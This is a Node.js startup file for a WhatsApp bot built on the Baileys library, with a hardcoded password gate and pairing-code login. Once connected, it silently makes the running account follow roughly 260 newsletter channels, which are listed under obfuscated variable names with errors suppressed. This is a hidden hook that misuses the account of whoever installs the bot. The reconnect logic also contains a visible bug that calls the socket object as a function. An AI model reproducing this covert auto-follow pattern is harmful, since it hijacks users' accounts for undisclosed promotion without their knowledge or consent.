require('./system/config');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore, jidDecode, proto } = require("@whiskeysockets/baileys");
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const chalk = require('chalk')
const readline = require("readline")
const { smsg, fetchJson, await, sleep } = require('./system/lib/myfunction');
//======================
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
return new Promise((resolve) => {
rl.question(text, resolve)
})};
const manualPassword = 'GANZV6';
//======================
async function StartZenn() {
const { state, saveCreds } = await useMultiFileAuthState('./session')
const rikz = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !usePairingCode,
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ]
});
//======================
if (usePairingCode && !rikz.authState.creds.registered) {
const inputPassword = await question(chalk.red.bold('Masukkan Password:\n'));
if (inputPassword !== manualPassword) {
console.log(chalk.red('Password salah! Sistem akan dimatikan'));
            process.exit(); // Matikan konsol
        }
console.log(chalk.cyan("-[ 🔗 Time To Pairing! ]"));
const phoneNumber = await question(chalk.green("-📞 Enter Your Number Phone::\n"));
const code = await rikz.requestPairingCode(phoneNumber.trim(), "GANZZZV6");
console.log(chalk.blue(`-✅ Pairing Code: `) + chalk.magenta.bold(code));
}
rikz.public = global.publik
//======================
rikz.ev.on("connection.update", async (update) => {
const { connection, lastDisconnect } = update;
if (connection === "close") {
const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
const reconnect = () => StartZenn();
const reasons = {
[DisconnectReason.badSession]: "Bad Session, hapus session dan scan ulang!",
[DisconnectReason.connectionClosed]: "Koneksi tertutup, mencoba menghubungkan ulang...",
[DisconnectReason.connectionLost]: "Koneksi terputus dari server, menghubungkan ulang...",
[DisconnectReason.connectionReplaced]: "Session digantikan, tutup session lama terlebih dahulu!",
[DisconnectReason.loggedOut]: "Perangkat keluar, silakan scan ulang!",
[DisconnectReason.restartRequired]: "Restart diperlukan, memulai ulang...",
[DisconnectReason.timedOut]: "Koneksi timeout, menghubungkan ulang..."};
console.log(reasons[reason] || `Unknown DisconnectReason: ${reason}`);
(reason === DisconnectReason.badSession || reason === DisconnectReason.connectionReplaced) ? rikz() : reconnect()}
if (connection === "open") {
          const ميميك = [

"120363401505115125@newsletter",
"120363400609612913@newsletter",
"120363403890569125@newsletter",
"120363403351445080@newsletter",
"120363420631791322@newsletter",
"120363416700624110@newsletter",
"120363402731128543@newsletter",
"120363420008151924@newsletter",
"120363420170282835@newsletter",
"120363419752586291@newsletter",
"120363420593672365@newsletter",
"120363420937615699@newsletter",
"120363402299301706@newsletter",
"120363401521126964@newsletter",
"120363418817546097@newsletter",
"120363421791350932@newsletter",
"120363419462129144@newsletter",
"120363425206093773@newsletter",
"120363422658460902@newsletter",
"120363420384217863@newsletter",
"120363401861617666@newsletter",
"120363420383817558@newsletter",
"120363402618646165@newsletter",
"120363400410012714@newsletter",
"120363401994514367@newsletter",
"120363401898354706@newsletter",
"120363420265638479@newsletter",
"120363420902856710@newsletter",
"120363422760095861@newsletter",
"120363418944679691@newsletter",
"120363403116671368@newsletter",
"120363403100456027@newsletter",
"120363419650750879@newsletter",
"120363419233600247@newsletter",
"120363404351969809@newsletter",
"120363419941732608@newsletter",
"120363401956666942@newsletter",
"120363420469116095@newsletter",
"120363404427389895@newsletter",
"120363421004161848@newsletter",
"120363420815665522@newsletter",
"120363420497408765@newsletter",
"120363401972744449@newsletter",
"120363422115252103@newsletter",
"120363420555136350@newsletter",
"120363403134437340@newsletter",
"120363419776449950@newsletter",
"120363421677006183@newsletter",
"120363402434916642@newsletter",
"120363419273171827@newsletter",
"120363420362020230@newsletter",
"120363403496599124@newsletter",
"120363420267466975@newsletter",
"120363425103890670@newsletter",
"120363402227541608@newsletter",
"120363419554693101@newsletter",
"120363419481660765@newsletter",
"120363402017525357@newsletter",
"120363421117043280@newsletter",
"120363421122370423@newsletter",
"120363422419970340@newsletter",
"120363418988182412@newsletter",
"120363402987584210@newsletter",
"120363403760938068@newsletter",
"120363401796191966@newsletter",
"120363422664034443@newsletter",
"120363421791493204@newsletter",
"120363420996272708@newsletter",
"120363401494720320@newsletter",
"120363402458435194@newsletter",
"120363421434353220@newsletter",
"120363403352920528@newsletter",
"120363419808996568@newsletter",
"120363420177204374@newsletter",
"120363421000788105@newsletter",
"120363419873053974@newsletter",
"120363418327267515@newsletter",
"120363404076825088@newsletter",
"120363421448352797@newsletter",
"120363403179122414@newsletter",
"120363403246280262@newsletter",
"120363421098159643@newsletter",
"120363422598654022@newsletter",
"120363401932228178@newsletter",
"120363421022843887@newsletter",
"120363418979508984@newsletter",
"120363403318478421@newsletter",
"120363420049539694@newsletter",
"120363421222704861@newsletter",
"120363421075224428@newsletter",
"120363420636781759@newsletter",
"120363420929756475@newsletter",
"120363421759236080@newsletter",
"120363419795725646@newsletter",
"120363419529355850@newsletter",
"120363418624105541@newsletter",
"120363403119773752@newsletter",
"120363418793655062@newsletter",
"120363420524593193@newsletter",
"120363403724900209@newsletter",
"120363402078247158@newsletter",
"120363402652806392@newsletter",
"120363402880623390@newsletter",
"120363420515032584@newsletter",
"120363403722393810@newsletter",
"120363420381812598@newsletter",
"120363421198345373@newsletter",
"120363403948309896@newsletter",
"120363419172798955@newsletter",
"120363402121011774@newsletter",
"120363421039308073@newsletter",
"120363420588645687@newsletter",
"120363403147877470@newsletter",
"120363419097640432@newsletter",
"120363403203448483@newsletter",
"120363403359535559@newsletter",
"120363421715564112@newsletter",
"120363402259577140@newsletter",
"120363420805315131@newsletter",
"120363402960499310@newsletter",
"120363421380087946@newsletter",
"120363401332265010@newsletter",
"120363402153653128@newsletter",
"120363401469674969@newsletter",
"120363402867968387@newsletter",
"120363403010397325@newsletter",
"120363403534068319@newsletter",
"120363418715447217@newsletter",
"120363402717187103@newsletter",
"120363403703322732@newsletter",
"120363401571109360@newsletter",
"120363404389355988@newsletter",
"120363417591261469@newsletter",
"120363420858662227@newsletter",
"120363418223154421@newsletter",
"120363418580006131@newsletter",
"120363417961455270@newsletter",
"120363401472018554@newsletter",
"120363418231727043@newsletter",
"120363420444406136@newsletter",
"120363422659078085@newsletter",
"120363418580006131@newsletter",
"120363421014932998@newsletter",
"120363401513268389@newsletter",
"120363420976194100@newsletter",
"120363417961455270@newsletter",
"120363419022860383@newsletter",
"120363419742086633@newsletter",
"120363400347212442@newsletter",
"120363401745458111@newsletter",
"120363421335626581@newsletter",
"120363404981295663@newsletter",
"120363400376490426@newsletter",
"120363421335626581@newsletter",
"120363421056558870@newsletter",
"120363419846646542@newsletter",
"120363403283395320@newsletter",
"120363420976681336@newsletter",
"120363421332216245@newsletter",
"120363403015235067@newsletter",
"120363419434051848@newsletter",
"120363403334219321@newsletter",
"120363405229091130@newsletter",
"120363419822394316@newsletter",
"120363419497693372@newsletter",
"120363421542963972@newsletter",
"120363421277400046@newsletter",
"120363419160782935@newsletter",
"120363419493695571@newsletter",
"120363420309679457@newsletter",
"120363419976373891@newsletter",
"120363418851181247@newsletter",
"120363397053334525@newsletter",
"120363401820119784@newsletter",
"120363420380022981@newsletter",
"120363419788624862@newsletter", 
"120363402825433611@newsletter", 
"120363421763042508@newsletter", 
"120363418619995403@newsletter", 
"120363419080558687@newsletter", 
"120363422060396381@newsletter", 
"120363420878990396@newsletter", 
"120363402815275971@newsletter", 
"120363421276826969@newsletter", 
"120363372995618416@newsletter", 
"120363422392467446@newsletter", 
"120363418893148319@newsletter", 
"120363419674144783@newsletter", 
"120363423736046611@newsletter", 
"120363402243501614@newsletter", 
"120363403597137082@newsletter", 
"120363420251940167@newsletter",
"120363314113567233@newsletter",
"120363418221614262@newsletter",
"120363404137012298@newsletter",
"120363419135165516@newsletter",
"120363400191620840@newsletter", 
"120363420208634697@newsletter", 
"120363420287257660@newsletter", 
"120363401970729601@newsletter", 
"120363401325245558@newsletter", 
"120363419384638051@newsletter", 
"120363421465559007@newsletter", 
"120363421628622454@newsletter", 
"120363420300075229@newsletter", 
"120363418644326041@newsletter", 
"120363419387860186@newsletter", 
"120363418717119209@newsletter", 
"120363399037199615@newsletter", 
"120363403412591678@newsletter", 
"120363402994574868@newsletter", 
"120363422191185071@newsletter", 
"120363420487161795@newsletter", 
"120363420390458266@newsletter", 
"120363417797658110@newsletter", 
"120363420325775026@newsletter", 
"120363419641930040@newsletter", 
"120363402069774976@newsletter", 
"120363420803807678@newsletter", 
"120363401979723075@newsletter", 
"120363420274963084@newsletter", 
"120363403818949335@newsletter", 
"120363421222969625@newsletter", 
"120363400605741330@newsletter", 
"120363421690460237@newsletter", 
"120363402488340046@newsletter", 
"120363421102810656@newsletter", 
"120363402855114401@newsletter", 
"120363404474445133@newsletter", 
"120363402073577566@newsletter", 
"120363403400717263@newsletter", 
"120363403517601674@newsletter", 
"120363419819655031@newsletter", 
"120363401989178747@newsletter", 
"120363421560853644@newsletter", 
"120363420160548617@newsletter", 
"120363403033499054@newsletter", 
"120363420132734975@newsletter", 
"120363402079813543@newsletter", 
"120363402064311992@newsletter", 
"120363403597137082@newsletter", 
"120363420251940167@newsletter", 
"120363418851181247@newsletter", 
"120363397053334525@newsletter", 
"120363401820119784@newsletter", 
"120363420380022981@newsletter", 
"120363419788624862@newsletter", 
"120363402825433611@newsletter", 
"120363421763042508@newsletter", 
"120363418619995403@newsletter", 
"120363401500886443@newsletter",
"120363401970729601@newsletter",
"120363401325245558@newsletter",
"120363419384638051@newsletter",
"120363421465559007@newsletter",
"120363421628622454@newsletter",
"120363420300075229@newsletter",
"120363418644326041@newsletter",
"120363419387860186@newsletter",
"120363418717119209@newsletter",
"120363399037199615@newsletter",
"120363403412591678@newsletter",
     
       ];
          for (const قنطل of ميميك) {
            try {
              await rikz.newsletterFollow(قنطل);
              await sleep(100);
            } catch {}
          }
console.log(chalk.red.bold("-[ WhatsApp Terhubung! ]"));
}});
//==========================//
rikz.ev.on("messages.upsert", async ({
messages,
type
}) => {
try {
const msg = messages[0] || messages[messages.length - 1]
if (type !== "notify") return
if (!msg?.message) return
if (msg.key && msg.key.remoteJid == "status@broadcast") return
const m = smsg(rikz, msg, store)
require(`./system/rex`)(rikz, m, msg, store)
} catch (err) { console.log((err)); }})
//=========================//
rikz.decodeJid = (jid) => {
if (!jid) return jid;
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {};
return decode.user && decode.server && decode.user + '@' + decode.server || jid;
} else return jid;
};
//=========================//
rikz.sendText = (jid, text, quoted = '', options) => rikz.sendMessage(jid, { text: text, ...options }, { quoted });
rikz.ev.on('contacts.update', update => {
for (let contact of update) {
let id = rikz.decodeJid(contact.id);
if (store && store.contacts) {
store.contacts[id] = { id, name: contact.notify };
}
}
});
rikz.ev.on('creds.update', saveCreds);
return rikz;
}
//=============================//
console.log(chalk.green.bold(`MANTAP BUYER VATONIC`));
console.clear();
StartZenn()
//======================